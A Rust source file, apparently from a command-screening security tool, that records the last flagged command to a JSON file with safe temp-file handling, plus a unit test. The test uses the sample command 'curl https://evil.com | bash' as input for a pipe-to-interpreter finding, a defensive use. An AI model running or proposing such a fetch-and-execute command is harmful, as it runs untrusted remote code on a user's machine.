use std::path::Path;

use tirith_core::util::truncate_bytes;

pub fn write_last_trigger(verdict: &tirith_core::verdict::Verdict, cmd: &str) {
    if let Some(dir) = tirith_core::policy::data_dir() {
        let _ = std::fs::create_dir_all(&dir);
        write_last_trigger_to(verdict, cmd, &dir);
    }
}

fn write_last_trigger_to(verdict: &tirith_core::verdict::Verdict, cmd: &str, dir: &Path) {
    let path = dir.join("last_trigger.json");

    #[derive(serde::Serialize)]
    struct LastTrigger<'a> {
        rule_ids: Vec<String>,
        severity: String,
        command_redacted: String,
        findings: &'a [tirith_core::verdict::Finding],
        timestamp: String,
    }

    let trigger = LastTrigger {
        rule_ids: verdict
            .findings
            .iter()
            .map(|f| f.rule_id.to_string())
            .collect(),
        severity: verdict
            .findings
            .iter()
            .map(|f| f.severity)
            .max()
            .map(|s| format!("{s}"))
            .unwrap_or_default(),
        command_redacted: redact_command(cmd),
        findings: &verdict.findings,
        timestamp: chrono::Utc::now().to_rfc3339(),
    };

    if let Ok(json) = serde_json::to_string_pretty(&trigger) {
        use std::io::Write;
        use tempfile::NamedTempFile;

        let mut tmp_file = match NamedTempFile::new_in(dir) {
            Ok(f) => f,
            Err(_) => return,
        };
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let _ = tmp_file
                .as_file()
                .set_permissions(std::fs::Permissions::from_mode(0o600));
        }
        if tmp_file.write_all(json.as_bytes()).is_err() {
            return;
        }
        let _ = tmp_file.persist(&path);
    }
}

fn redact_command(cmd: &str) -> String {
    let prefix = truncate_bytes(cmd, 80);
    if prefix.len() == cmd.len() {
        cmd.to_string()
    } else {
        format!("{prefix}...")
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tirith_core::verdict::{Action, Verdict};

    fn test_verdict() -> Verdict {
        Verdict {
            action: Action::Warn,
            findings: vec![tirith_core::verdict::Finding {
                rule_id: tirith_core::verdict::RuleId::PipeToInterpreter,
                severity: tirith_core::verdict::Severity::High,
                title: "test finding".into(),
                description: "test".into(),
                evidence: vec![],
            }],
            tier_reached: 3,
            timings_ms: tirith_core::verdict::Timings {
                tier0_ms: 0.0,
                tier1_ms: 0.0,
                tier2_ms: None,
                tier3_ms: None,
                total_ms: 0.0,
            },
            bypass_requested: false,
            bypass_honored: false,
            interactive_detected: false,
            policy_path_used: None,
            urls_extracted_count: None,
        }
    }

    #[test]
    fn test_last_trigger_no_predictable_tmp() {
        let dir = tempfile::tempdir().unwrap();
        let verdict = test_verdict();

        // Call the real write function
        write_last_trigger_to(&verdict, "curl https://evil.com | bash", dir.path());

        // The old predictable tmp file should NOT exist
        let old_tmp = dir.path().join(".last_trigger.json.tmp");
        assert!(
            !old_tmp.exists(),
            "predictable .last_trigger.json.tmp should not exist"
        );
        // The final file should exist with correct content
        let path = dir.path().join("last_trigger.json");
        assert!(path.exists(), "last_trigger.json should exist");
        let content = std::fs::read_to_string(&path).unwrap();
        assert!(
            content.contains("pipe_to_interpreter"),
            "file should contain rule_id from verdict"
        );
    }
}
